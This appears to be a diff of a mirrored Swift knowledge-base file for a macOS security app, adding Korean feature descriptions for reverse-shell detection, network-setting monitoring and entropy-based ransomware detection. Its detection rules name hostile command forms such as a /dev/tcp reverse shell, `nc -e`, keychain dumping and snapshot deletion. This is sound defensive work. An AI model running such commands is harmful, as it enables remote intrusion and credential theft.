@@ -1,5 +1,5 @@
 // ─────────────────────────────────────────────────────────────────────────────
-// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.12.9 (build 171).
+// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.12.10 (build 172).
 // The RoamSwitch app is the source of truth. Do NOT edit this copy: changes here
 // are not compiled into the shipping app and are overwritten on the next sync.
 // Regenerate with ./scripts/sync-from-roamswitch.sh — see SYNC.md.
@@ -323,7 +323,7 @@ extension RoamSwitchKnowledgeBase {
                 • 위협 정보: 하루에 한 번 수신 전용으로 가져오며 식별자는 전송하지 않고, 전용 Ed25519 정보 키(앱 업데이트 키와는 별개)로 검증합니다. "자동 업데이트"를 끄면 외부 통신이 전혀 없으며 내장 데이터와 동형 문자 탐지만으로 동작합니다.
                 • Pro가 아닌 경우: 모드는 저장되지만 아무것도 차단되지 않습니다.
                 """,
-                recommendation: "기본값인 자동 차단을 유지하고 시스템 확장을 승인하는 것이 가장 확실합니다. 사내 도구가 실수로 차단되면 알림의 \u{201C}이번만 허용(5분)\u{201D}이나 허용 목록을 사용하세요."
+                recommendation: "기본값인 자동 차단을 유지하고 시스템 확장을 승인하는 것이 가장 확실합니다. 사내 도구가 실수로 차단되면 알림의 \u{201C}이번만 허용(5분)\u{201D}을 사용하세요."
             ),
             LocalizedEntry(
                 id: "feat_link_safety_auditor",
@@ -331,6 +331,7 @@ extension RoamSwitchKnowledgeBase {
                 summary: "브라우저에서 의심스러운 URL을 열기 전에 기기 내에서만 분석하여 유니코드 동형 문자, 서브도메인 위장, 고위험 TLD, 평문 HTTP, 원시 IP 주소 등을 기준으로 100점 만점으로 위험도를 평가합니다. 무료 버전에서도 사용할 수 있습니다.",
                 details: """
                 • 열기: 악성코드 보호 → "🔗 링크 수동 확인…" 또는 MCP 도구 `audit_url_safety`.
+                • 무력화 표기 주소: 위협 보고서에 쓰인 `hxxps://example[.]com` 같은 표기 그대로 붙여 넣을 수 있습니다. 분석 전에 원래 주소로 되돌립니다.
                 • 동형 문자: 키릴 문자나 그리스 문자처럼 비슷하게 생긴 글자(Punycode / `xn--`)를 탐지합니다.
                 • 서브도메인 위장: `apple.com.login-verify.xyz`처럼 유명 브랜드 이름을 끼워 넣은 구조를 분석합니다.
                 • 고위험 TLD: 일회성 피싱에서 흔히 쓰이는 `.xyz`, `.top`, `.tk`, `.icu` 등에 감점을 매깁니다.
@@ -349,6 +350,7 @@ extension RoamSwitchKnowledgeBase {
                 • 자동 대응: (1) 응용 프로그램 방화벽 잠금 (2) 에어갭 봉쇄(pf가 모든 트래픽을 차단하고 Wi-Fi 무선을 끔, feat_airgap_containment) (3) 공유 서비스(SMB / SSH / 화면 공유) 정지 (4) 의심되는 프로세스를 강제 종료 대신 SIGSTOP으로 일시 정지 (5) 긴급 경보와 최전면 긴급 창 표시.
                 • 종료 대신 정지하는 이유: 네트워크가 이미 차단되었으므로 정지된 프로세스는 더 이상 피해를 줄 수 없습니다. 오탐이었다면 해제 시 SIGCONT로 재개되어 데이터 손실이 없습니다.
                 • 해제 시: 네트워크와 Wi-Fi가 복원되고, 정지된 프로세스가 재개되며, 변조된 미끼 파일이 다시 생성됩니다.
+                • 범용 탐지(엔트로피 분석, Pro): 미끼 파일을 건드리지 않는 암호화도 `Documents`·`Desktop`·`Downloads`·`Pictures`에 기록되는 파일의 내용으로 탐지합니다. 파일 전체의 섀넌 엔트로피가 7.92 이상인 파일이 5초 안에 20개 이상이 되면 대량 암호화 버스트로 취급합니다. 파일의 앞부분만, 또는 4KiB 이상의 블록을 하나 걸러 암호화하는 방식에 대비해 4KiB 단위 구간도 확인하며, 7.9 이상인 구간이 2개 이상 있는 16KiB 이상의 파일도 셉니다. ZIP·PDF·JPEG 등 압축 형식의 헤더가 온전한 파일은 대상에서 제외합니다. 구간 판정은 빌드 산출물(`.o`·`.a`·`.rlib`·`.rmeta`·`.so`·`.dylib`·`.class`·`.pyc`·`.wasm` 등)과 `target` 폴더 안에는 사용하지 않습니다. 4KiB보다 작은 블록(16바이트나 256바이트 등)만 암호화하는 방식은 이 판정으로는 보이지 않습니다. 실측에서는 해당 폴더의 실제 파일 3,531개에서 추가 탐지가 없었습니다. 실제 파일 150개로 앞부분만, 그리고 4KiB 이상 블록을 하나 걸러 암호화한 경우를 모의했을 때, 파일 전체 값으로는 0~35%, 구간 판정으로는 100%를 탐지했습니다.
                 • 기본값: Pro를 처음 활성화할 때 자동으로 켜집니다. 사고 기록은 MCP 도구 `get_canary_status`로 확인할 수 있습니다. 메뉴의 "랜섬웨어 방어 시뮬레이션(동작 확인)"으로 안전하게 테스트할 수 있습니다.
                 """,
                 recommendation: "알 수 없는 랜섬웨어로부터 중요한 데이터를 보호하려면 계속 켜 두고, 숨겨진 미끼 파일은 삭제하지 마세요."
@@ -405,7 +407,7 @@ extension RoamSwitchKnowledgeBase {
                 details: """
                 • 동작 방식: 권한 있는 헬퍼가 `/usr/bin/eslogger exec fork exit`를 자식 프로세스로 실행하고 그 JSON 스트림을 해석합니다. eslogger는 macOS에 포함된 도구이며 RoamSwitch는 EndpointSecurity 권한(entitlement)을 사용하거나 신청하지 않습니다. 따라서 실행 전 차단이 아니라 사후 관찰입니다.
                 • 필요 조건: macOS 13 이상과 전체 디스크 접근 권한에서 RoamSwitch 허용. 권한이 없으면 창에 「실행 기록을 사용할 수 없습니다: 전체 디스크 접근 권한에서 RoamSwitch를 허용하세요(목록에 없으면 「+」로 /Applications/RoamSwitch.app을 추가)」(또는 eslogger를 찾을 수 없음)라고만 표시하고 상시 폴링으로 대체하지 않습니다. 기록을 켜기 전이나 헬퍼 시작 전의 이벤트는 남지 않습니다.
-                • 상관 규칙(알림 전용, 기본적으로 조용함, 각 규칙에 고정 ID와 MITRE ATT&CK 기법): 브라우저/Office/메일 앱이 셸이나 스크립트 인터프리터를 직접 실행(exec.shell_from_app, T1059) / /tmp, /private/var/tmp 또는 격리 속성이 있는 위치에서 서명 없음·임시(ad-hoc) 서명 바이너리 실행(exec.untrusted_location, T1204.002) / curl/wget을 셸로 넘기는 `sh -c` 한 줄 명령 중 IP 주소 URL, base64, eval, TLS 검증 해제, 브라우저 부모 같은 의심 정황이 함께 있는 것(exec.pipe_to_shell, T1059.004) / `osascript -e`로 do shell script와 base64/eval을 조합한 것(exec.osascript_obfuscated, T1059.002) / `xattr -d com.apple.quarantine` 후 15분 이내에 그 파일을 실행(exec.quarantine_stripped_then_exec, T1553.001) / 최근 24시간 안에 기록된 LaunchAgent/LaunchDaemon에서 서명 없음·임시 서명 바이너리가 launchd를 통해 시작(exec.launchd_untrusted_binary, T1543.001/.004) / Apple 서명이 아닌, 셸이 아닌 조상 프로세스 아래에서 `security find-generic-password -w` 또는 `dump-keychain` 실행(exec.keychain_access, T1555.001) / osascript 이외의 순수 인터프리터가 인라인 `-c`/`-e`/`-Command` 한 줄 코드를 실행하며 base64/eval과 다운로드 또는 exec 유사 호출을 결합한 것(exec.interpreter_inline_obfuscated, T1059) / DYLD_INSERT_LIBRARIES를 설정한 비-Apple 서명 바이너리 실행(exec.dyld_insert_libraries, T1574.006) / RoamSwitch 자신도 Apple 프로세스도 아닌 무언가가 실행한 `tmutil deletelocalsnapshots`/`thinlocalsnapshots`(exec.ransomware_recovery_tampering, T1490); 명령줄이 RoamSwitch가 설치한 미끼 인증 정보 파일(~/.aws/credentials, ~/.env.backup 등 내용에 표식이 있는 것)을 직접 지정해 실행됨(exec.honeytoken_path, T1552.001. 실제 파일은 대상이 아니며, 라이브러리를 통한 읽기는 허니토큰 감시가 담당). 스크립트나 AI 에이전트가 구동하는 공격 도구 연쇄(HexStrike AI 같은 백엔드 등)를 노리는 규칙도 2개 있습니다. 하나의 프로세스가 30초 안에 서로 다른 침투 테스트 도구 8개 이상을 which/type으로 연달아 조회하는 경우(exec.offensive_tool_inventory, T1595)와, 스크립트 런타임이나 AI 코딩 에이전트가 2분 안에 같은 종류의 서로 다른 도구 3개 이상을 실행하는 경우(exec.offensive_tool_burst, T1595)입니다. 사람이 터미널에서 같은 명령을 입력하는 것은 감지하지 않습니다. 터미널에서 평범하게 입력한 `curl | sh`는 의도적으로 감지하지 않습니다.
+                • 상관 규칙(알림 전용, 기본적으로 조용함, 각 규칙에 고정 ID와 MITRE ATT&CK 기법): 브라우저/Office/메일 앱이 셸이나 스크립트 인터프리터를 직접 실행(exec.shell_from_app, T1059) / /tmp, /private/var/tmp, /var/folders 아래의 임시 폴더, /Users/Shared 또는 격리 속성이 있는 위치에서 서명 없음·임시(ad-hoc) 서명 바이너리 실행(exec.untrusted_location, T1204.002) / curl/wget을 셸로 넘기는 `sh -c` 한 줄 명령 중 IP 주소 URL, base64, eval, TLS 검증 해제, 브라우저 부모 같은 의심 정황이 함께 있는 것(exec.pipe_to_shell, T1059.004) / `osascript -e`로 do shell script와 base64/eval을 조합한 것(exec.osascript_obfuscated, T1059.002) / `xattr -d com.apple.quarantine` 후 15분 이내에 그 파일을 실행(exec.quarantine_stripped_then_exec, T1553.001) / 최근 24시간 안에 기록된 LaunchAgent/LaunchDaemon에서 서명 없음·임시 서명 바이너리가 launchd를 통해 시작(exec.launchd_untrusted_binary, T1543.001/.004) / Apple 서명이 아닌, 셸이 아닌 조상 프로세스 아래에서 `security find-generic-password -w` 또는 `dump-keychain` 실행(exec.keychain_access, T1555.001) / osascript 이외의 순수 인터프리터가 인라인 `-c`/`-e`/`-Command` 한 줄 코드를 실행하며 base64/eval과 다운로드 또는 exec 유사 호출을 결합한 것(exec.interpreter_inline_obfuscated, T1059) / DYLD_INSERT_LIBRARIES를 설정한 비-Apple 서명 바이너리 실행(exec.dyld_insert_libraries, T1574.006) / RoamSwitch 자신도 Apple 프로세스도 아닌 무언가가 실행한 `tmutil deletelocalsnapshots`/`thinlocalsnapshots`(exec.ransomware_recovery_tampering, T1490); 명령줄이 RoamSwitch가 설치한 미끼 인증 정보 파일(~/.aws/credentials, ~/.env.backup 등 내용에 표식이 있는 것)을 직접 지정해 실행됨(exec.honeytoken_path, T1552.001. 실제 파일은 대상이 아니며, 라이브러리를 통한 읽기는 허니토큰 감시가 담당). 스크립트나 AI 에이전트가 구동하는 공격 도구 연쇄(HexStrike AI 같은 백엔드 등)를 노리는 규칙도 2개 있습니다. 하나의 프로세스가 30초 안에 서로 다른 침투 테스트 도구 8개 이상을 which/type으로 연달아 조회하는 경우(exec.offensive_tool_inventory, T1595)와, 스크립트 런타임이나 AI 코딩 에이전트가 2분 안에 같은 종류의 서로 다른 도구 3개 이상을 실행하는 경우(exec.offensive_tool_burst, T1595)입니다. 사람이 터미널에서 같은 명령을 입력하는 것은 감지하지 않습니다. 터미널에서 평범하게 입력한 `curl | sh`는 의도적으로 감지하지 않습니다. `sh -c` 명령줄, 또는 직접 실행한 nc·ncat·socat의 명령줄에 리버스 셸(바인드 셸 포함)의 형태가 적혀 있는 경우도 감지합니다(exec.reverse_shell_argv, T1059.004). 대상은 셸을 싣는 /dev/tcp·/dev/udp 리다이렉트, mkfifo 파이프를 nc·telnet·openssl s_client·ssh에 연결하는 형태, `nc -e <셸>`, socat의 exec:<셸>, 셸로 파이프하는 openssl s_client입니다. `echo > /dev/tcp/host/22` 같은 포트 확인이나 이런 명령을 글자로 언급하기만 한 문장은 감지하지 않습니다.
                 • 알림: 알림(Pro)과 인시던트 타임라인 기록(출처 execRecorder, 조치 「알림 전용」). 알림 하나만으로 Air-Gap 등의 격리가 발동되는 일은 없습니다.
                 • 저장: /Library/Application Support/RoamSwitch/exec_log 아래의 세그먼트 분할 JSON Lines(root 전용 0700/0600. 명령줄에 비밀 정보가 포함될 수 있어, 앱·뷰어·MCP 서버는 권한 있는 헬퍼를 통해서만 읽습니다), 기본 200MB·14일(변경 가능), 충돌에도 안전한 로테이션. 세그먼트를 해시 체인으로 연결해 삭제·수정·잘림을 탐지합니다(「체인 검증」). 변조 탐지일 뿐 변조 방지는 아닙니다. 환경 변수는 기록하지 않지만 명령줄 인수에는 민감한 정보가 포함될 수 있습니다.
                 • 부하 대책: 과부하 시 오래된 줄부터 버리는 제한 큐(건수 표시), 지수 백오프 재시작, 끄면 eslogger가 완전히 중지됩니다.
@@ -416,14 +418,16 @@ extension RoamSwitchKnowledgeBase {
             LocalizedEntry(
                 id: "feat_persistence_monitor_guard",
                 title: "신규 자동 실행 등록(LaunchAgent / LaunchDaemon) 감시 (Pro)",
-                summary: "새로운 LaunchAgent / LaunchDaemon 등록을 실시간으로 감시하다가, 셸이나 스크립트 인터프리터를 직접 실행하거나 서명이 유효하지 않은 실행 파일을 등록하면 알립니다.",
+                summary: "새로운 LaunchAgent / LaunchDaemon 등록을 실시간으로 감시하다가, 셸이나 스크립트 인터프리터를 직접 실행하거나 서명이 유효하지 않은 실행 파일을 등록하면 알립니다. 또한 셸 시작 파일처럼 저절로 실행되는 곳에 의심스러운 줄이 나타나도 알립니다.",
                 details: """
                 • 감시 대상: `~/Library/LaunchAgents`, `/Library/LaunchAgents`, `/Library/LaunchDaemons`를 FSEvents로 감시합니다(약 1.5초의 디바운스).
                 • 판정 근거: 최근의 정보 탈취형 악성코드는 유효하게 Apple 서명된 `/bin/bash`나 `/usr/bin/osascript`가 Base64로 숨긴 스크립트를 실행하게 하여 지속성을 확보합니다. 인터프리터 자체의 서명은 유효하므로, 순수 인터프리터를 직접 실행하는 등록은 서명 상태와 무관하게 의심스러운 것으로 처리되며, 스크립트 인자도 정적 시그니처 검사를 거칩니다. 서명되지 않았거나 서명이 유효하지 않은 실행 파일도 표시됩니다. Homebrew services 래퍼는 예외입니다.
                 • 탐지만 수행: EndpointSecurity 권한이 없어 plist 작성 자체를 막을 수는 없습니다. 작성된 지 약 1.5초 안에 판정하고 보고합니다.
+                • 추가 감시 대상(저절로 실행되는 곳): 셸 시작 파일(`~/.zshrc`, `~/.zshenv`, `~/.zprofile`, `~/.zlogin`, `~/.zlogout`, `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.bash_logout`, `~/.config/fish/config.fish`, `/etc/zshrc`, `/etc/zshenv`, `/etc/zprofile`, `/etc/zlogin`, `/etc/profile`, `/etc/bashrc`), `~/.ssh/rc`와 `/etc/ssh/sshrc`, 정기 스크립트(`/etc/periodic/{daily,weekly,monthly}`, `/usr/local/etc/periodic/*`, `/etc/{daily,weekly,monthly}.local`, 있는 경우에만), git 훅을 두는 폴더(`~/.git-templates/hooks`, `~/.config/git/hooks`), 로그인/로그아웃 훅(`/Library/Preferences/com.apple.loginwindow.plist`의 LoginHook / LogoutHook), 폴더 액션 스크립트(`~/Library/Scripts/Folder Action Scripts`와 `/Library/Scripts/Folder Action Scripts`. 컴파일된 AppleScript는 osadecompile로 읽고 `.scptd` 번들은 읽지 않음). 5초마다 확인하며, 처음 한 번은 이미 있는 내용을 기록만 하고 알리지 않습니다. `emond`는 대상이 아닙니다.
+                • 판정(위의 장소): 리버스 셸, 복호화 후 그대로 실행, 내려받아 그대로 실행, 임시 폴더(`/tmp`, `/var/folders` 등)에 있는 프로그램 실행 형태의 줄만 알립니다. 평범한 줄이 늘어나도 알리지 않습니다. 셸 시작 파일·`~/.ssh/rc`·git 훅은 주인이 자주 편집하므로, 원래 있던 의심스러운 줄은 다시 알리지 않고 새로 늘어난 줄만 알립니다. 로그인/로그아웃 훅은 설정된 것만으로 알립니다.
                 • 기본값: Pro에서 기본으로 켜져 있습니다. 악성코드 보호 → "신규 자동 실행 등록(LaunchAgent/Daemon) 감시 (Pro)"에서 전환할 수 있습니다.
                 """,
-                recommendation: "낯선 등록 경고를 받으면 알림에 표시된 plist를 확인하고 알아볼 수 없다면 삭제하세요. 정당한 앱을 막 설치한 직후라면 대개 문제없습니다."
+                recommendation: "낯선 등록 경고를 받으면 알림에 표시된 plist를 확인하고 알아볼 수 없다면 삭제하세요. 정당한 앱을 막 설치한 직후라면 대개 문제없습니다. 시작 파일 등에 대한 알림이라면 알림에 표시된 줄을 확인하고, 짐작 가는 것이 없으면 그 줄을 삭제하세요."
             ),
             LocalizedEntry(
                 id: "feat_docker_event_guard",
@@ -438,6 +442,43 @@ extension RoamSwitchKnowledgeBase {
                 """,
                 recommendation: "개발에 Docker를 사용한다면 컨테이너 탈출 위험을 조기에 발견하기 위해 활성화하세요."
             ),
+            LocalizedEntry(
+                id: "feat_reverse_shell_watch",
+                title: "리버스 셸 실시간 탐지 (Pro)",
+                summary: "몇 초마다 로그인한 사용자의 셸이나 인터프리터의 입력과 출력이 외부 서버로의 TCP 연결로 되어 있지 않은지 확인하고, 리버스 셸이 의심되면 알립니다. Pro 전용이며 기본으로 켜져 있습니다.",
+                details: """
+                • 여는 방법: 메뉴 막대의 '🐚/✅ 리버스 셸 상시 감시 (Pro)'로 전환합니다.
+                • 방식: 4초마다 libproc으로 프로세스 목록과 각 프로세스가 연 파일 디스크립터를 읽습니다. lsof 같은 외부 명령은 실행하지 않으며 연결의 내용은 읽지 않습니다.
+                • 탐지하는 형태: (1) 셸이나 인터프리터(sh, bash, zsh, python, perl, ruby, php, node 등)의 입력(0번)과 출력(1번)이 같은 '수립된 외부 TCP 연결'인 형태(`bash -i >& /dev/tcp/H/P 0>&1`, 또는 소켓을 dup2하는 Python 한 줄). (2) nc, ncat, socat이 `-e`, `--exec`, `exec:`로 다른 프로그램을 연결에 이어 주는 형태. (3) nc 옆에, 같은 부모가 시작한 입력과 출력이 파이프인 셸이 있는 형태(`mkfifo`를 쓰는 고리. Mac 기본 nc에는 `-e`가 없어서 이 형태가 쓰입니다).
+                • 보는 상대: 공인 주소만입니다. 가정 내 LAN, Tailscale(100.64.0.0/10), 컨테이너, 루프백은 보지 않습니다. 원격 개발이나 ProxyCommand에서의 오탐을 피하기 위해서입니다.
+                • 외부로 향한 연결의 판정: 대기 포트에서 받은 연결이나 로컬 포트가 49152 미만인 연결은 리버스 셸로 보지 않습니다.
+                • 알림 조건: 같은 상태를 연속 두 번 확인했을 때만 알리며 프로세스당 한 번입니다. 같은 이름의 프로그램이 같은 상대에 연결하는 알림은 15분에 한 번까지입니다.
+                • 알림만: 프로세스 종료도 네트워크 차단도 자동으로 하지 않습니다.
+                • 한계: 로그인한 사용자 자신의 프로세스만 대상입니다. root 권한 프로세스는 보이지 않습니다. 목록에 없는 이름의 프로그램과 사설 주소로의 연결은 보지 않습니다. 스크립트 파일에 적혀 있기만 한 것은 연결하기 전까지 보이지 않습니다.
+                • 허용 목록: 짚이는 프로그램은 메뉴의 '최근 리버스 셸 탐지를 허용 목록에 추가…'로 '이름@접속 대상'으로 추가할 수 있습니다.
+                • 프로세스 실행 기록기(feat_exec_recorder)의 `exec.reverse_shell_argv`는 명령줄에 적힌 형태를 시작 시점에 탐지합니다. 이 기능은 연결된 뒤의 실제 상태를 탐지합니다.
+                • Pro 라이선스를 잃으면 자동으로 꺼집니다.
+                """,
+                recommendation: "알림이 오면 프로그램 경로와 부모 프로세스를 확인하세요. 짚이는 점이 없다면 프로세스를 종료하고 네트워크를 끊은 뒤 조사하세요."
+            ),
+            LocalizedEntry(
+                id: "feat_network_settings_watch",
+                title: "네트워크 설정 변경 모니터링 (가짜 DHCP·WPAD 대비, Pro)",
+                summary: "연결된 네트워크가 나눠 준 DNS 서버, 라우터, 프록시 자동 구성(PAC)을 같은 네트워크의 이전 상태와 비교해 달라졌다면 알립니다. 가짜 DHCP 서버나 WPAD를 이용한 중간자 공격의 단서입니다. Pro 전용이며 기본으로 켜져 있습니다.",
+                details: """
+                • 여는 방법: 메뉴 막대의 '🌐/✅ 네트워크 설정 변경 감시 (Pro)'로 전환합니다.
+                • 방식: macOS 시스템 구성 저장소(SCDynamicStore)의 변화를 받아 몇 초 기다린 뒤, 유선과 Wi-Fi(en 인터페이스)의 DNS와 라우터를 읽습니다. 외부 명령도 통신도 사용하지 않습니다.
+                • 비교 대상: Wi-Fi는 이름(SSID)으로, 이름을 읽을 수 없을 때와 유선은 라우터의 하드웨어 주소로 네트워크를 구별합니다. 처음 본 네트워크는 기억만 하고 알리지 않습니다.
+                • 알리는 변화: (1) 그 네트워크에서 본 적 없는 DNS 서버. 라우터 자신의 주소, 널리 알려진 공개 DNS, RoamSwitch의 보안 DNS는 제외합니다. (2) 본 적 없는 라우터와 본 적 없는 DNS 서버가 동시에 나타난 경우. 가짜 DHCP 서버가 나눠 주는 형태이므로 더 강한 알림이 됩니다. (3) 본 적 없는 호스트의 프록시 자동 구성(PAC). (4) '프록시 자동 검색'(WPAD)이 새로 켜진 경우. 라우터 자체가 새 것이고 자기 주소를 DNS 서버로 함께 나눠 주는 경우에는 강한 알림(새 라우터와 새 DNS 서버)이 됩니다. 라우터 자신의 주소를 제외하는 것은 그 라우터가 이미 알려진 경우뿐입니다.
+                • 알리지 않는 것: 라우터만 바뀐 경우는 기억만 합니다(교체는 흔하고 게이트웨이 변화는 네트워크 기록과 ARP 감시가 봅니다). VPN, Tailscale 등의 터널(utun 등)은 읽지 않습니다. 서비스 설정에 저장된 DNS(본인, 구성 프로파일, RoamSwitch의 보안 DNS가 설정한 것)는 네트워크가 나눠 준 것이 아니므로 비교하지 않습니다. DNS-over-HTTPS 프로파일은 여기에 나타나지 않습니다. 라우터가 세 종류 이상 보인 네트워크(학교나 회사처럼 장소마다 서브넷이 다른 곳)에서는 새 라우터를 보통의 일로 취급합니다.
+                • 수락: 같은 내용의 알림은 한 번만 보냅니다. 라우터 교체처럼 이유를 아는 변화는 메뉴의 '네트워크 설정 기준을 현재 상태로 갱신…'으로 현재 상태를 그 네트워크의 올바른 상태로 기록합니다. 자동으로 수락하지는 않습니다.
+                • 감사와의 관계: 감사 항목 '프록시 자동 검색 (WPAD / PAC)'(proxy_autodiscovery)은 지금 이 순간 WPAD나 네트워크가 지정한 PAC가 유효한지 확인합니다.
+                • 알림만: 설정을 바꾸지도 차단하지도 않습니다.
+                • 한계: 가짜 DHCP 서버 자체는 보이지 않고 결과의 차이만 단서가 됩니다. 이전과 같은 DNS와 라우터를 나눠 주는 가짜 서버는 찾지 못합니다. macOS에는 LLMNR이 없습니다. NetBIOS 이름 서비스(netbiosd)는 macOS에 있지만 그 응답의 변조는 감시하지 않습니다. mDNS(Bonjour)는 설계대로 동작하는 기능이므로 탐지 대상으로 삼지 않습니다.
+                • Pro 라이선스를 잃으면 자동으로 꺼집니다.
+                """,
+                recommendation: "알림이 오면 네트워크 이름과 표시된 DNS 서버나 라우터를 확인하세요. 라우터나 통신사를 바꿨다면 수락하고, 짚이는 점이 없다면 그 네트워크 사용을 중단하세요."
+            ),
         ]
     }
 
@@ -450,9 +491,9 @@ extension RoamSwitchKnowledgeBase {
                 title: "중요 시스템 파일 변조 감시 (Critical Path FIM) (Pro)",
                 summary: "sudoers, SSH 설정, PAM, hosts처럼 정당한 OS 업데이트나 앱 설치로는 거의 바뀌지 않는 중요 파일의 SHA-256 기준값을 기록하고, 수정·삭제·신규 파일이 생기면 알립니다.",
                 details: """
-                • 대상 파일: `/etc/sudoers`, `/etc/pam.d/sudo`, `/etc/ssh/sshd_config`, `/etc/ssh/sshd_config.d/` 아래의 모든 파일, `/etc/hosts`, 그리고 root의 `~/.ssh/authorized_keys`. 이들은 root 전용이므로 특권 헬퍼가 해시를 계산합니다.
+                • 대상 파일: `/etc/sudoers`, `/etc/sudoers.d/` 아래의 모든 파일, `/etc/pam.d/` 아래의 모든 파일, `/etc/ssh/sshd_config`, `/etc/ssh/sshd_config.d/` 아래의 모든 파일, `/etc/hosts`, 그리고 root의 `~/.ssh/authorized_keys`. 이들은 root 전용이므로 특권 헬퍼가 해시를 계산합니다.
                 • 시점: `/etc`, `/etc/pam.d`, `/etc/ssh`의 FSEvents가 거의 실시간으로 재검사를 유발하며, 매시간 검사가 안전장치로 작동합니다.
-                • 기준선: 첫 검사에서 확보됩니다. 탐지된 변경 사항은 사람이 검토할 때까지 자동으로 새 기준선으로 채택되지 않으므로 발견 내용이 계속 남아 있습니다. 앱이 실행되는 동안 같은 상태에 대해서는 다시 알리지 않으며, 추가 변경이 있으면 다시 경고합니다.
+                • 기준선: 첫 검사에서 확보됩니다. 탐지된 변경과, 추가 파일(`/etc/sudoers.d/`와 `/etc/ssh/sshd_config.d/` 아래의 파일, `/etc/pam.d/sudo_local`)이 아닌 파일의 삭제는 사람이 검토할 때까지 자동으로 새 기준선으로 채택되지 않으므로 발견 내용이 계속 남아 있습니다. 앱이 실행되는 동안 같은 상태에 대해서는 다시 알리지 않으며, 추가 변경이 있으면 다시 경고합니다. 새 파일은 한 번 알린 뒤 기준선에 추가됩니다. 삭제된 추가 파일은 한 번 알린 뒤 기준선에서 제외됩니다. sudo에 Touch ID를 켜면 `/etc/pam.d/sudo_local`이 만들어지며, 새 파일 알림으로 한 번만 표시됩니다. 끄면 이 파일이 삭제되며, 이것도 한 번만 알립니다. 받아들이려면 악성코드 보호 → "중요 파일 기준을 현재 상태로 갱신…"을 사용하세요. 먼저 차이 목록이 표시됩니다.
                 • 사각지대 경고: 헬퍼에 3회 연속 접속하지 못하면 변조 탐지가 작동하지 않고 있다고 알려줍니다.
                 • 참고: 링크 보호가 hosts 대체 모드로 동작하는 동안 RoamSwitch 자체가 관리하는 `/etc/hosts` 구역을 다시 쓸 수 있습니다. LaunchAgent / Daemon은 feat_persistence_monitor_guard가 담당합니다.
                 • 기본값: Pro를 처음 활성화할 때 자동으로 켜집니다. 메뉴: 악성코드 보호 → "중요 시스템 파일 변조를 정기적으로 감시 (Pro)".
@@ -505,7 +546,7 @@ extension RoamSwitchKnowledgeBase {
                 details: """
                 • 여는 방법: 메뉴 "Mac 보안 종합 진단" → "📈 보안 활동 로그…".
                 • 데이터 출처: 봉쇄 사고 타임라인(feat_containment_incident_timeline, 최신 200건)과 웹메일 다운로드 보호(feat_webmail_download_guard)에서 확정된 악성코드 탐지 결과를 통합한 목록입니다.
-                • 필터: 카테고리(ARP 스푸핑, 랜섬웨어 미끼 파일, XProtect 연동 Air-Gap, 포트 이상, ClickFix, 실행 기록, 랜섬웨어 엔트로피 탐지, 허니토큰, 브라우저 자격 증명 감시, 위험한 다운로드), 심각도(전체/info/warning/critical), 기간(과거 24시간/과거 3일간/과거 7일간/전체 기간), 자유 텍스트 검색(요약·상세·카테고리 이름을 대상으로 대소문자를 구분하지 않는 부분 일치).
+                • 필터: 카테고리(ARP 스푸핑, 랜섬웨어 미끼 파일, XProtect 연동 Air-Gap, 포트 이상, ClickFix, 실행 기록, 랜섬웨어 엔트로피 탐지, 허니토큰, 브라우저 자격 증명 감시, 리버스 셸 탐지, 네트워크 설정 변경 감시, 위험한 다운로드), 심각도(전체/info/warning/critical), 기간(과거 24시간/과거 3일간/과거 7일간/전체 기간), 자유 텍스트 검색(요약·상세·카테고리 이름을 대상으로 대소문자를 구분하지 않는 부분 일치).
                 • 시계열 그래프: 선택한 기간의 탐지 건수를 막대 그래프로 표시합니다. 기간이 72시간 이하면 1시간 단위, 초과하면 1일 단위로 자동 전환됩니다. 막대를 클릭하면 해당 시간대로만 좁혀볼 수 있고, 다시 클릭하면 해제됩니다.
                 • 표시 개수: 최신 500건까지 표시합니다(초과 시 더 있다는 안내와 함께 필터를 좁히도록 안내).
                 • 내보내기: CSV 내보내기(Pro).
@@ -587,6 +628,7 @@ extension RoamSwitchKnowledgeBase {
                 • 범위: node_modules 바로 아래 1단계(@scope/ 패키지는 한 단계 더). 패키지 자체의 중첩된 node_modules에는 내려가지 않습니다.
                 • 참고용 위험 패턴 표시: curl|sh, wget|sh, eval(, base64 -d, node -e와 일치하는 명령에는 ⚠️ 배지가 표시되지만, 이는 경량 휴리스틱에 의한 참고 정보이며 많은 정상 스크립트(네이티브 모듈 빌드 등)도 해당됩니다.
                 • 네트워크 연결을 전혀 하지 않으며, 스크립트를 실행하지도 않습니다. 순수한 정적 목록 표시입니다.
+                • 확인 완료 상태와의 차이: 「현재 상태를 확인 완료로 표시」를 누르면 그 시점의 패키지 상태(스크립트 내용은 해시만, 컴파일된 코드의 유무)를 기록합니다. 다음 목록 조회부터는 그 이후 설치 시 실행되는 코드가 늘어난 패키지를 보여 줍니다: 스크립트 추가, 스크립트 내용 변경, 컴파일된 코드 추가(`binding.gyp`, `.node`·`.so`·`.dylib`·`.dll`, 실행 파일), 이 중 하나를 가진 새 패키지. 사라진 스크립트나 패키지는 보여 주지 않습니다. 확인 완료로 표시할 수 있는 것은 사람뿐이며, 목록 조회와 MCP 도구는 표시하지 않습니다(MCP 결과에 `drift`와 `baselineAcceptedAt`이 붙습니다). 기록은 `~/Library/Application Support/RoamSwitch/package_install_baseline.json`(권한 0600)입니다.
                 • MCP 도구: `run_package_lifecycle_script_scan` (`watchedFolders` 인자, Pro 전용).
                 """,
                 recommendation: "⚠️ 표시가 있는 스크립트는 해당 패키지에 정말 필요한 작업인지 개별적으로 확인하세요. 낯선 패키지의 postinstall은 특히 주의가 필요합니다."
@@ -632,6 +674,18 @@ extension RoamSwitchKnowledgeBase {
                 recommendation: "⚠️가 표시된 의존성은 실제 오타인지 개별적으로 다시 확인하세요 — 낯선 패키지 이름은 특히 주의가 필요합니다."
             ),
             LocalizedEntry(
+                id: "feat_dependency_source_scan",
+                title: "의존성 출처 점검 (pip / npm, Pro)",
+                summary: "프로젝트 파일을 읽어 의존성 혼동(같은 이름의 공개 패키지가 비공개 패키지를 대신하는 것)을 허용하는 설정을 찾습니다. pip의 extra-index-url과, .npmrc로 고정되지 않은 비공개 레지스트리의 npm 스코프가 대상입니다.",
+                details: """
